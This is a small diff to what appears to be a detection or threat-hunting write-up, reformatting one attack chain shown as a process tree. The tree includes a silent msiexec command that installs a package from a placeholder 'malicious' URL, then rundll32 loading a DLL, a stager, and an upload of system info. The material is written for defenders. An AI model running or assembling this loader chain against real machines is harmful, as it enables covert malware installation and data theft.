@@ -121,9 +121,9 @@ Scheduled Task logs
 
 
 # Chain 4 — MSI Loader → Rundll32 → Payload
+`browser.exe / outlook.exe`
 
-`browser.exe / outlook.exe
-  └─ msiexec.exe /i https://malicious/payload.msi /qn
+ ` └─ msiexec.exe /i https://malicious/payload.msi /qn
        └─ rundll32.exe malicious.dll,ExportFunc
             └─ payload.exe (stager)
                  └─ upload system info
